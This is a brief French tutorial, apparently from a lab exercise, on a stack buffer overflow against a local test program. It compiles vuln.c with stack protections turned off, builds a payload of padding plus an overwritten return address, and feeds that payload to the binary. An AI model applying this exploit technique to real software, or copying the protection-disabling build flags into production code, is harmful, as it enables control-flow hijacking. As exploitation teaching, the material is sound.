# Exemple de Bufffer Overflow

- Compiler le code vulnerable :

```
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -g  
```

- Crafter l'exploit :

```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x56\x11\x40\x00\x00\x00\x00\x00')" > payload.bin
```

- Exploiter le programme :

```
./vuln < payload.bin
```
